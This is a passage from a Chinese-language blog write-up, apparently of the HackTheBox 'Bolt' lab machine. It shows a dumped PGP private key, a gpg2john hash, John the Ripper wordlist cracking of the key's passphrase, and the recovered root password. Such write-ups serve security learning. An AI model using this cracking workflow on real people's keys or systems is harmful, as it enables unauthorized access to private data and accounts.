class="line">QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf</span><br><span class="line">DRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/</span><br><span class="line">7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2</span><br><span class="line">AZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49</span><br><span class="line">tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc</span><br><span class="line">Uct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP</span><br><span class="line">yF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj</span><br><span class="line">XTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e</span><br><span class="line">IHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp</span><br><span class="line">eqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM</span><br><span class="line">vjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp</span><br><span class="line">ZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ</span><br><span class="line">AQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H</span><br><span class="line">/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF</span><br><span class="line">nyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba</span><br><span class="line">qx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt</span><br><span class="line">zc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74</span><br><span class="line">7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F</span><br><span class="line">U3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY</span><br><span class="line">HMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5</span><br><span class="line">zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M</span><br><span class="line">KeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP</span><br><span class="line">rOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8</span><br><span class="line">Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7</span><br><span class="line">XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP</span><br><span class="line">leD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU</span><br><span class="line">KP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f</span><br><span class="line">a6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67</span><br><span class="line">JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH</span><br><span class="line">kERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+</span><br><span class="line">Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT</span><br><span class="line">Gh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB</span><br><span class="line">GquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong</span><br><span class="line">cVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO</span><br><span class="line">n0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz</span><br><span class="line">4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT</span><br><span class="line">4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h</span><br><span class="line">J6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt</span><br><span class="line">1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS</span><br><span class="line">UCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU</span><br><span class="line">Nsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf</span><br><span class="line">QmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm</span><br><span class="line">oRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg</span><br><span class="line">6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/</span><br><span class="line">Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8</span><br><span class="line">11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm</span><br><span class="line">YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0</span><br><span class="line">PSwYYWlAywj5</span><br><span class="line">=cqxZ</span><br><span class="line">-----END PGP PRIVATE KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gist.github.com/jhjguxin/6037564">GPG 加密解密简明教程</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali @ kali in ~ [21:43:50] </span></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">BurpSuitePro  Documents  eddie.key  file.enc         Music     Public    sql_test   Videos</span><br><span class="line">Desktop       Downloads  eddie.pub  lab_mi3aka.ovpn  Pictures  SecTools  Templates</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali @ kali in ~ [21:43:50] </span></span><br><span class="line">$ gpg --import eddie.pub</span><br><span class="line">gpg: key 1C2741A3DC3B4ABD: <span class="string">&quot;Eddie Johnson &lt;eddie@bolt.htb&gt;&quot;</span> not changed</span><br><span class="line">gpg: Total number processed: 1</span><br><span class="line">gpg:              unchanged: 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali @ kali in ~ [21:44:32] </span></span><br><span class="line">$ gpg --import eddie.key</span><br><span class="line">gpg: key 1C2741A3DC3B4ABD: <span class="string">&quot;Eddie Johnson &lt;eddie@bolt.htb&gt;&quot;</span> not changed</span><br><span class="line">gpg: key 1C2741A3DC3B4ABD: secret key imported</span><br><span class="line">gpg: Total number processed: 1</span><br><span class="line">gpg:              unchanged: 1</span><br><span class="line">gpg:       secret keys <span class="built_in">read</span>: 1</span><br><span class="line">gpg:  secret keys unchanged: 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali @ kali in ~ [21:44:37] </span></span><br><span class="line">$ gpg -d file.enc       </span><br><span class="line">gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25</span><br><span class="line">      <span class="string">&quot;Eddie Johnson &lt;eddie@bolt.htb&gt;&quot;</span></span><br><span class="line">gpg: public key decryption failed: Operation cancelled</span><br><span class="line">gpg: decryption failed: No secret key</span><br></pre></td></tr></table></figure>

<p>这玩意还要输入密码…</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png"></p>
<p>用前面已知的去试了一下好像都不对,要用<code>john</code>去爆破了…</p>
<p><a target="_blank" rel="noopener" href="https://www.openwall.com/lists/john-users/2012/11/08/6">Noob: trying to recover own gpg/pgp passphrase with limited set of characters</a></p>
<p>这篇文章说要先把<code>gpg</code>格式转化成<code>john</code>可以读取的<code>hash</code>格式</p>
<p><a target="_blank" rel="noopener" href="https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html">Cracking GPG key passwords using John The Ripper </a></p>
<p><del>有个叫<code>gpg2john</code>的工具,不知道为啥系统里面的john没有这个工具…</del></p>
<p><del>瞄了眼wp,密码是<code>merrychristmas</code></del></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john</span><br><span class="line">cd john/src</span><br><span class="line">./configure &amp;&amp; make -s clean &amp;&amp; make -sj4</span><br></pre></td></tr></table></figure>

<p>在<code>john/run</code>中得到<code>gpg2john</code></p>
<p><code>./gpg2john -d eddie.key &gt; eddie.hash</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*00000000000000000000000000000000*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::eddie.key</span><br></pre></td></tr></table></figure>

<p><code>./john --wordlist=rockyou.txt eddie.hash</code>进行爆破,得到密码为<code>merrychristmas</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png"></p>
<p>得到一个新的密码<code>Z(2rmxsNW(Z?3=p/9s</code>,应该是<code>root</code>或者是<code>clark</code>的密码,验证确认是<code>root</code>密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/01/05/htb-Archetype/" rel="prev" title="HackTheBox-Archetype">
                  <i class="fa fa-chevron-left"></i> HackTheBox-Archetype
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/01/07/htb-Forge/" rel="next" title="HackTheBox-Forge">
                  HackTheBox-Forge <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Misaka</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
